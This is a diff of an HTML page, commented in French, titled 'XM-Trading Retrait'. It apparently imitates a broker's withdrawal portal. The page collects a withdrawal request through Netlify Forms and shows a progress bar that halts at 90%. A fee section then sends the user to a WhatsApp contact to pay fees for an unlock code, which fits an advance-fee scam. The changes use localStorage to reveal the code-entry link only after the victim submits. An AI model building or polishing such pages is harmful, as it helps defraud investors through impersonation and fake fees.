@@ -41,7 +41,6 @@
       display: flex;
       align-items: center;
       justify-content: space-between;
-      /* Si vous avez un logo : placez une balise <img> dans le HTML */
     }
     header.site-header .logo {
       display: flex;
@@ -198,12 +197,12 @@
       color: #333;
     }
     #feeSection p a {
-      color: #d9534f; /* rouge accent pour contact */
+      color: #d9534f; /* rouge pour contact */
       font-weight: 500;
     }
     #feeSection button {
       margin-top: 15px;
-      background-color: #28a745; /* vert pour l’étape “J’ai un code” */
+      background-color: #28a745; /* vert pour étape “J’ai un code” */
     }
     #feeSection button:hover {
       background-color: #218838;
@@ -280,7 +279,6 @@
       <h1>XM-Trading Retrait</h1>
     </div>
     <nav>
-      <!-- Exemples de liens : personnalisez si besoin -->
       <a href="#initial-section">Accueil</a>
       <a href="#initial-section">Demande</a>
       <a href="#footer-contact">Contact</a>
@@ -340,8 +338,8 @@
 
         <input type="submit" value="Valider la demande">
       </form>
-      <!-- Lien pour sauter directement à la saisie du code, si déjà soldé hors-ligne -->
-      <p style="margin-top:10px;">
+      <!-- Lien “Cliquez ici pour saisir votre code” masqué au départ et révélé après soumission -->
+      <p id="showCodeWrapper" style="margin-top:10px; display:none;">
         Vous avez déjà soldé les frais ? 
         <a href="#" id="showCodeDirect">Cliquez ici pour saisir votre code</a>
       </p>
@@ -394,7 +392,7 @@
     <p>Contact : <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a> | WhatsApp: +237 6XXXXXXX</p>
   </footer>
 
-  <!-- Mapping pays-indicatif et logique JS inline -->
+  <!-- Mapping pays-indicatif et logique JS inline avec localStorage -->
   <script>
     // Mapping simple pays → indicatif
     const countryDialCodes = [
@@ -436,6 +434,7 @@
       const withdrawalForm = document.getElementById('withdrawal-form');
       const confirmForm = document.getElementById('confirm-form');
       const confirmError = document.getElementById('confirmError');
+      const showCodeWrapper = document.getElementById('showCodeWrapper');
       const showCodeDirect = document.getElementById('showCodeDirect');
       const modal = document.getElementById('progressModal');
       const progressBar = document.getElementById('progressBar');
@@ -443,12 +442,28 @@
       const feeSection = document.getElementById('feeSection');
       const haveCodeBtn = document.getElementById('haveCodeBtn');
 
+      // Au chargement, vérifier if déjà soumis auparavant
+      const hasSubmitted = localStorage.getItem('hasSubmitted') === 'true';
+      if (hasSubmitted) {
+        // Montrer le lien pour saisir le code directement
+        if (showCodeWrapper) showCodeWrapper.style.display = 'block';
+      } else {
+        // Masquer le lien la première fois
+        if (showCodeWrapper) showCodeWrapper.style.display = 'none';
+      }
+
       // Lien “Cliquez ici pour saisir votre code”
       if (showCodeDirect) {
         showCodeDirect.addEventListener('click', (e) => {
           e.preventDefault();
-          if (initialSection) initialSection.style.display = 'none';
-          if (codeSection) codeSection.style.display = 'block';
+          // Ne permettre l’accès que si déjà soumis une fois
+          if (localStorage.getItem('hasSubmitted') === 'true') {
+            if (initialSection) initialSection.style.display = 'none';
+            if (codeSection) codeSection.style.display = 'block';
+          } else {
+            // Optionnel : message ou redirection vers formulaire initial
+            alert("Vous devez d’abord soumettre la demande de retrait avant de saisir un code.");
+          }
         });
       }
 
@@ -469,6 +484,11 @@
             body: encode(data)
           }).then(()=>console.log("Envoyé à Netlify Forms"))
             .catch(err=>console.error("Erreur Netlify Forms:", err));
+
+          // Marquer en localStorage que l’utilisateur a soumis au moins une fois
+          localStorage.setItem('hasSubmitted', 'true');
+          // Afficher le lien “Cliquez ici...” désormais
+          if (showCodeWrapper) showCodeWrapper.style.display = 'block';
 
           // Lancer modal + progression jusqu’à 90%
           showProgressModal();
